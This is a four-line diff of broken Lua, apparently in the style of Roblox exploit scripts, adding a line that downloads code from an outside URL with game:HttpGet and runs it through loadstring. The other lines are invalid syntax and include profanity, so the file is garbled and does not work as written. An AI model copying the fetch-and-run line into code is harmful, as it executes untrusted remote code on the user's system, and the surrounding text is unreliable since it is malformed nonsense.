@@ -1,0 +1,4 @@
+if KJI = true
+loadstring(game:HttpGet(('https://allah.net'),true))()
+if KJI = False
+fuck KJI = true
